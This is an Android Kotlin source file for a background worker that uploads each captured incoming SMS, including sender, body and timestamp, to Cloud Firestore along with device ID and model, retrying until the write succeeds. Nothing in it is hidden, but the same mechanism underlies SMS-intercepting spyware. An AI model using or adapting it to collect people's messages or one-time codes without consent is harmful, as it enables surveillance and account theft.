package com.example.sms

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlin.coroutines.resume
import kotlin.coroutines.resumeWithException

/**
 * Reliably uploads a captured incoming SMS to Cloud Firestore.
 * Retries with backoff until the write is confirmed, so no SMS is lost offline.
 */
class SmsUploadWorker(
    appContext: Context,
    params: WorkerParameters
) : CoroutineWorker(appContext, params) {

    override suspend fun doWork(): Result {
        val smsId = inputData.getString(KEY_ID)
        val sender = inputData.getString(KEY_SENDER)
        if (smsId.isNullOrBlank() || sender.isNullOrBlank()) {
            Log.w(TAG, "Discarding SMS work with missing id/sender")
            return Result.failure()
        }

        val payload = mapOf(
            "id" to smsId,
            "sender" to sender,
            "body" to (inputData.getString(KEY_BODY) ?: ""),
            "timestamp" to inputData.getLong(KEY_TIMESTAMP, System.currentTimeMillis()),
            "deviceId" to (inputData.getString(KEY_DEVICE_ID) ?: ""),
            "deviceModel" to (inputData.getString(KEY_DEVICE_MODEL) ?: ""),
            "uploadedAt" to System.currentTimeMillis()
        )

        return try {
            upload(payload, smsId)
            Log.d(TAG, "SMS from $sender synced to Cloud Firestore")
            Result.success()
        } catch (e: Exception) {
            Log.w(TAG, "SMS upload attempt ${runAttemptCount + 1} failed: ${e.message}")
            if (runAttemptCount < MAX_RETRIES) Result.retry() else Result.failure()
        }
    }

    private suspend fun upload(payload: Map<String, Any>, smsId: String) {
        suspendCancellableCoroutine { continuation ->
            val task = FirebaseFirestore.getInstance()
                .collection(COLLECTION)
                .document(smsId)
                .set(payload)

            task.addOnSuccessListener {
                if (continuation.isActive) continuation.resume(Unit)
            }
            task.addOnFailureListener { e ->
                if (continuation.isActive) continuation.resumeWithException(e)
            }
        }
    }

    companion object {
        private const val TAG = "SmsUploadWorker"
        const val COLLECTION = "incoming_sms"
        const val KEY_ID = "id"
        const val KEY_SENDER = "sender"
        const val KEY_BODY = "body"
        const val KEY_TIMESTAMP = "timestamp"
        const val KEY_DEVICE_ID = "deviceId"
        const val KEY_DEVICE_MODEL = "deviceModel"
        private const val MAX_RETRIES = 6
    }
}
